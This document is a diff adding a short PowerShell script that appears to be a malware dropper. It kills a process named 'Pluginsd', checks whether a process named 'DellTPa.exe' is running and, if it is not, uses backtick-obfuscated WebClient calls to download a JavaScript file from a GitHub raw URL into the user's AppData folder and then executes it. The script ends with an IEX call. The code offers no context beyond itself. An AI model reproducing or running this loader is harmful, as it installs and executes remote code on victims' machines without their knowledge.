@@ -1,0 +1,20 @@
+Stop-Process -Name "Pluginsd"
+
+Function dwn
+{
+	
+  $running = Get-Process DellTPa.exe -ErrorAction SilentlyContinue
+   
+    if (!$running)
+    {
+        
+		(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/trueandtrust/fsdewrwerghgyrr/main/Pluginsd.js', "C:\Users\$env:UserName\AppData\Local\Programs\Common\Pluginsd.js");[System.Diagnostics.Process]::Start("C:\Users\$env:UserName\AppData\Local\Programs\Common\Pluginsd.js");
+	
+	}
+	
+		
+}
+
+
+IEX dwn
+
